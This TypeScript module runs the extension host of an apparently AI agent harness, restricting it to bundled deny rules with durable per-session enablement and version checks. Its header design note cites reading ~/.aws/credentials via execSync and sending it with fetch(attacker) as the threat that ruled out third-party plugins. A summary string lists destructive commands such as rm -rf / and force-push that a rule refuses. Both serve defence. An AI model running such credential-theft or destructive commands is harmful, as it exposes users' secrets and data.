import { CONTRACT_VERSION } from "@clawdparty/contracts";
import type { LoopStore } from "../store/types.js";
import type { Handler, PointName } from "./points.js";
import { bundledRules } from "./rules/deny_destructive_bash.js";

/**
 * The extension host — BUNDLED CONTRIBUTORS ONLY, by decision.
 *
 * There is deliberately no `install` and no `discover`. A measurement showed that a `worker_thread` with
 * `env: {}` isolates the ENVIRONMENT and nothing else: code inside one reads any file the harness
 * user can read (verified against `~/.claude.json` and the credential module's own source), spawns
 * processes, and reaches the network. So `execSync("cat ~/.aws/credentials")` followed by
 * `fetch(attacker)` is two lines, and 's "a third-party plugin attempting to read a provider
 * credential fails" is not achievable by that mechanism.
 *
 * Rather than ship a containment claim the runtime cannot support, third-party LOADING is not built.
 * is then satisfied by construction — there is no path that loads foreign code — which is a
 * smaller claim and a true one. `plugin_loading.test.ts` asserts the absence, because an absence
 * nothing tests is one a later refactor restores.
 *
 * What  asked for that DOES ship: per-session enablement that is durable, attributable, visible
 * in the room, and carried in the request snapshot. Those are properties of the contributor set, not
 * of where the code came from.
 *
 * **The bundled/third-party asymmetry is now moot rather than documented.** The complexity
 * tradeoff justified running bundled code in-process while third-party code got a worker. With no
 * third-party tier there is no asymmetry to explain: everything runs in-process, which is what
 * "bundled" always meant.
 */

/** A contributor's identity as the RECORD carries it. */
export interface PluginDescriptor {
  id: string;
  version: string;
  /** `bundled` is the only value that can occur; the union is the contract's, not a plan. */
  origin: "bundled" | "external";
  /** The contract this contributor was written against. */
  contractVersion: { major: number; minor: number };
  /** Which points it registers on — shown in the panel so a reader knows what it can do. */
  contributes: PointName[];
  /** One line, participant-facing. The panel renders it verbatim. */
  summary: string;
  /** Whether a session has it on when nobody has chosen. */
  enabledByDefault: boolean;
}

/** Participant-facing text, kept beside the host so the panel needs no copy of its own. */
const SUMMARIES: Record<string, string> = {
  "bundled:deny-destructive-bash":
    "Refuses obviously destructive shell commands (rm -rf /, force-push, raw disk writes). A filter, not a security boundary.",
  "bundled:deny-out-of-tree-write":
    "Refuses a write outside the session worktree, independently of the tool's own containment.",
};

/**
 * Every contributor this build ships.
 *
 * `contributes` is derived from the handler rather than restated, so the descriptor cannot claim a
 * point the code does not register on — the shape of drift a hand-written list invites.
 */
export const BUNDLED: PluginDescriptor[] = bundledRules.map((rule) => ({
  id: rule.id,
  version: "1.0.0",
  origin: "bundled" as const,
  contractVersion: CONTRACT_VERSION,
  contributes: [rule.point],
  summary: SUMMARIES[rule.id] ?? rule.id,
  enabledByDefault: true,
}));

export function descriptorFor(id: string): PluginDescriptor | null {
  return BUNDLED.find((plugin) => plugin.id === id) ?? null;
}

/**
 * Whether this build can run a contributor written against `contractVersion`.
 *
 * An incompatible one is REFUSED with a reason, never loaded and never silently downgraded: a
 * contributor that half-works is worse than one that is absent, because the room cannot tell which
 * of its rules are in force.
 *
 * Exact MAJOR, and MINOR at least what the contributor needs — the same rule consumers apply to
 * `CONTRACT_VERSION`, so a breaking bump fails the check rather than slipping through a loose `>=`.
 */
export function compatibility(
  descriptor: PluginDescriptor,
): { ok: true } | { ok: false; reason: string } {
  const want = descriptor.contractVersion;
  if (want.major !== CONTRACT_VERSION.major) {
    return {
      ok: false,
      reason:
        `${descriptor.id} targets contract ${want.major}.${want.minor}; this harness serves ` +
        `${CONTRACT_VERSION.major}.${CONTRACT_VERSION.minor}. A major difference is breaking.`,
    };
  }
  if (want.minor > CONTRACT_VERSION.minor) {
    return {
      ok: false,
      reason:
        `${descriptor.id} needs contract minor ${want.minor}; this harness serves ` +
        `${CONTRACT_VERSION.minor}. Upgrade the harness.`,
    };
  }
  return { ok: true };
}

/** The register's shape, which is also what a reader gets back after the plugin is gone. */
type EnabledRecord = Array<{ id: string; version: string; origin: "bundled" | "external" }>;

/**
 * Which contributors a session has on.
 *
 * Absent register = nobody has chosen = the defaults. Stored explicitly the first time anyone
 * changes anything, so "never configured" and "configured to the same thing" stay distinguishable.
 */
export function activeFor(store: LoopStore, sessionId: string): PluginDescriptor[] {
  const record = store.readRegister("session.plugins", sessionId) as EnabledRecord | null;
  if (record === null) {
    return BUNDLED.filter((plugin) => plugin.enabledByDefault);
  }
  // Resolved through `descriptorFor`, so a register naming something this build no longer ships is
  // ignored rather than crashing the run — and the record still holds what it named.
  return record
    .map((entry) => descriptorFor(entry.id))
    .filter((d): d is PluginDescriptor => d !== null);
}

/** The handlers to register for a session — `activeFor` resolved to live code. */
export function handlersFor(store: LoopStore, sessionId: string): Handler<PointName>[] {
  const active = new Set(activeFor(store, sessionId).map((plugin) => plugin.id));
  return bundledRules.filter((rule) => active.has(rule.id)) as Handler<PointName>[];
}

/**
 * Turn one on or off for a session, durably.
 *
 * Returns the writes rather than committing, so the caller can put them in the SAME transaction as
 * the `plugin_enabled`/`plugin_disabled` event — enablement and its announcement must not be able to
 * disagree after a crash.
 *
 * The DESCRIPTOR is copied into the register, not referenced : a session stays readable
 * after a contributor is removed from the build, because the record says what it was.
 */
export function enablementWrites(
  store: LoopStore,
  sessionId: string,
  id: string,
  enabled: boolean,
):
  | { ok: true; writes: Parameters<LoopStore["commit"]>[0]["writes"] }
  | { ok: false; reason: string } {
  const descriptor = descriptorFor(id);
  if (descriptor === null) {
    return {
      ok: false,
      reason: `unknown extension: ${id}. Known: ${BUNDLED.map((p) => p.id).join(", ")}`,
    };
  }
  const compatible = compatibility(descriptor);
  if (!compatible.ok) {
    return compatible;
  }

  const current = activeFor(store, sessionId);
  const next = enabled
    ? [...current.filter((p) => p.id !== id), descriptor]
    : current.filter((p) => p.id !== id);

  return {
    ok: true,
    writes: [
      {
        kind: "register",
        op: "set",
        namespace: "session.plugins",
        key: sessionId,
        value: next.map((p) => ({ id: p.id, version: p.version, origin: p.origin })),
      },
    ],
  };
}
